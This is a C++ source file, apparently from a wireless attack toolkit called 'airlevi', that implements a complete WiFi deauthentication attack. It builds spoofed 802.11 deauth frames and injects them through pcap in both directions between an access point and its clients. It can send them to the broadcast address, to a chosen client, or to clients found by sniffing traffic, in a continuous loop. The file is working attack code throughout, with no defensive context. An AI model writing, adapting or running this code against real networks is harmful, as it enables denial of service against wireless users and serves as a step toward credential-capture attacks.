#include "airlevi-deauth/deauth_attack.h"
#include "common/logger.h"
#include "common/packet_parser.h"
#include <pcap.h>
#include <cstring>
#include <algorithm>
#include <sstream>

namespace airlevi {

DeauthAttack::DeauthAttack(const Config& config)
    : config_(config), broadcast_mode_(false), packet_count_(0), 
      delay_ms_(100), reason_code_(7), running_(false) {
    
    interface_ = std::make_unique<NetworkInterface>(config.interface);
    stats_.start_time = std::chrono::steady_clock::now();
}

DeauthAttack::~DeauthAttack() {
    stop();
}

bool DeauthAttack::start() {
    if (running_) return true;
    
    Logger::getInstance().info("Starting deauth attack");
    
    if (!setupInterface()) {
        Logger::getInstance().error("Failed to setup interface");
        return false;
    }
    
    running_ = true;
    
    // Start client discovery if not in broadcast mode and no specific client set
    if (!broadcast_mode_ && target_client_.toString() == "00:00:00:00:00:00") {
        discovery_thread_ = std::thread(&DeauthAttack::clientDiscoveryLoop, this);
    }
    
    // Start attack thread
    attack_thread_ = std::thread(&DeauthAttack::attackLoop, this);
    
    Logger::getInstance().info("Deauth attack started");
    return true;
}

void DeauthAttack::stop() {
    if (running_) {
        running_ = false;
        
        if (attack_thread_.joinable()) {
            attack_thread_.join();
        }
        
        if (discovery_thread_.joinable()) {
            discovery_thread_.join();
        }
        
        Logger::getInstance().info("Deauth attack stopped");
    }
}

void DeauthAttack::setTargetAP(const std::string& bssid) {
    // Parse BSSID string to MacAddress
    std::istringstream iss(bssid);
    std::string byte_str;
    int i = 0;
    
    while (std::getline(iss, byte_str, ':') && i < 6) {
        target_ap_.bytes[i++] = static_cast<uint8_t>(std::stoul(byte_str, nullptr, 16));
    }
}

void DeauthAttack::setTargetClient(const std::string& mac) {
    std::istringstream iss(mac);
    std::string byte_str;
    int i = 0;
    
    while (std::getline(iss, byte_str, ':') && i < 6) {
        target_client_.bytes[i++] = static_cast<uint8_t>(std::stoul(byte_str, nullptr, 16));
    }
}

DeauthStatistics DeauthAttack::getStatistics() const {
    std::lock_guard<std::mutex> lock(stats_mutex_);
    auto stats = stats_;
    
    auto now = std::chrono::steady_clock::now();
    stats.duration_seconds = std::chrono::duration_cast<std::chrono::seconds>(
        now - stats_.start_time).count();
    
    return stats;
}

void DeauthAttack::attackLoop() {
    int packets_sent = 0;
    
    while (running_) {
        if (packet_count_ > 0 && packets_sent >= packet_count_) {
            Logger::getInstance().info("Reached packet count limit");
            break;
        }
        
        auto targets = getTargetClients();
        
        if (targets.empty()) {
            if (config_.verbose) {
                Logger::getInstance().debug("No target clients found, waiting...");
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
            continue;
        }
        
        for (const auto& client : targets) {
            if (!running_) break;
            
            // Send deauth from AP to client
            if (sendDeauthPacket(target_ap_, client)) {
                packets_sent++;
                updateStatistics();
            }
            
            // Send deauth from client to AP
            if (sendDeauthPacket(client, target_ap_)) {
                packets_sent++;
                updateStatistics();
            }
            
            if (config_.verbose) {
                Logger::getInstance().debug("Sent deauth packets to " + client.toString());
            }
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms_));
    }
}

void DeauthAttack::clientDiscoveryLoop() {
    while (running_) {
        discoverClients();
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

bool DeauthAttack::sendDeauthPacket(const MacAddress& ap, const MacAddress& client) {
    auto packet = craftDeauthFrame(ap, client, reason_code_);
    return injectPacket(packet);
}

std::vector<uint8_t> DeauthAttack::craftDeauthFrame(const MacAddress& src, const MacAddress& dst, uint16_t reason) {
    std::vector<uint8_t> frame;
    
    // 802.11 header for deauth frame
    frame.resize(24 + 2); // Header + reason code
    
    // Frame control (deauth frame)
    frame[0] = 0xc0; // Type: Management, Subtype: Deauthentication
    frame[1] = 0x00; // Flags
    
    // Duration
    frame[2] = 0x00;
    frame[3] = 0x00;
    
    // Address 1 (destination)
    memcpy(&frame[4], dst.bytes, 6);
    
    // Address 2 (source)
    memcpy(&frame[10], src.bytes, 6);
    
    // Address 3 (BSSID)
    memcpy(&frame[16], target_ap_.bytes, 6);
    
    // Sequence control
    frame[22] = 0x00;
    frame[23] = 0x00;
    
    // Reason code
    frame[24] = reason & 0xff;
    frame[25] = (reason >> 8) & 0xff;
    
    return frame;
}

bool DeauthAttack::injectPacket(const std::vector<uint8_t>& packet) {
    // Use pcap to inject the packet
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(config_.interface.c_str(), 65536, 1, 1000, errbuf);
    
    if (!handle) {
        Logger::getInstance().error("Failed to open interface for injection: " + std::string(errbuf));
        return false;
    }
    
    int result = pcap_inject(handle, packet.data(), packet.size());
    pcap_close(handle);
    
    return result > 0;
}

void DeauthAttack::discoverClients() {
    // Passive client discovery by monitoring traffic
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(config_.interface.c_str(), 65536, 1, 1000, errbuf);
    
    if (!handle) return;
    
    PacketParser parser;
    
    // Capture packets for a short time
    auto start = std::chrono::steady_clock::now();
    while (running_ && std::chrono::steady_clock::now() - start < std::chrono::seconds(2)) {
        struct pcap_pkthdr* header;
        const uint8_t* packet;
        
        int result = pcap_next_ex(handle, &header, &packet);
        if (result != 1) continue;
        
        // Look for data frames to/from our target AP
        if (parser.isDataFrame(packet)) {
            MacAddress src, dst;
            if (parser.parseDataFrame(packet, header->caplen, src, dst)) {
                // Check if this involves our target AP
                if (src == target_ap_ && !(dst == target_ap_)) {
                    addDiscoveredClient(dst);
                } else if (dst == target_ap_ && !(src == target_ap_)) {
                    addDiscoveredClient(src);
                }
            }
        }
    }
    
    pcap_close(handle);
}

void DeauthAttack::addDiscoveredClient(const MacAddress& client) {
    std::lock_guard<std::mutex> lock(clients_mutex_);
    
    if (discovered_clients_.insert(client).second) {
        Logger::getInstance().info("Discovered client: " + client.toString());
    }
}

std::vector<MacAddress> DeauthAttack::getTargetClients() {
    std::vector<MacAddress> targets;
    
    if (broadcast_mode_) {
        // Use broadcast address
        MacAddress broadcast;
        memset(broadcast.bytes, 0xff, 6);
        targets.push_back(broadcast);
    } else if (target_client_.toString() != "00:00:00:00:00:00") {
        // Use specific client
        targets.push_back(target_client_);
    } else {
        // Use discovered clients
        std::lock_guard<std::mutex> lock(clients_mutex_);
        targets.assign(discovered_clients_.begin(), discovered_clients_.end());
    }
    
    return targets;
}

bool DeauthAttack::setupInterface() {
    if (!interface_->interfaceExists(config_.interface)) {
        Logger::getInstance().error("Interface " + config_.interface + " does not exist");
        return false;
    }
    
    if (config_.monitor_mode && !interface_->setMonitorMode(true)) {
        Logger::getInstance().error("Failed to set monitor mode on " + config_.interface);
        return false;
    }
    
    if (!interface_->isUp() && !interface_->bringUp()) {
        Logger::getInstance().error("Failed to bring up interface " + config_.interface);
        return false;
    }
    
    return true;
}

void DeauthAttack::updateStatistics() {
    std::lock_guard<std::mutex> lock(stats_mutex_);
    stats_.packets_sent++;
    
    // Update clients deauthed count
    if (broadcast_mode_) {
        stats_.clients_deauthed = 1; // Broadcast affects all
    } else {
        std::lock_guard<std::mutex> client_lock(clients_mutex_);
        stats_.clients_deauthed = discovered_clients_.size();
    }
}

} // namespace airlevi
